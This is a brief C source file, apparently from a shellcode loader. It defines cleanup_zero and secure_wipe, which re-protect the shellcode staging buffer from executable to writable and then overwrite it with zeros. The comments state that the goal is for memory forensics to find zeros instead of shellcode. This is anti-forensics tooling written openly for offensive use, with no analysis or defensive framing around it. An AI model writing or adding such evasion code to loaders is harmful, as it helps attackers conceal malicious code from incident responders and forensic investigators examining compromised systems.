/* Post-execution cleanup: volatile zeroing so memory forensics
 * sees zeros instead of shellcode. Volatile so the compiler
 * cannot optimize the wipe away.
 *
 * secure_wipe is for regions already marked RX (the shellcode
 * staging buffer): it re-protects to RW first, because wiping an
 * RX page faults. */
#include "loader.h"
#include "services.h"

void cleanup_zero(void *addr, size_t len) {
    volatile uint8_t *b = (volatile uint8_t *)addr;
    for (size_t i = 0; i < len; i++)
        b[i] = 0;
}

void secure_wipe(void *addr, size_t len) {
    if (!addr || !len)
        return;
    ULONG old = 0;
    _VirtualProtect(addr, (SIZE_T)len, PAGE_READWRITE, &old);
    cleanup_zero(addr, len);
}
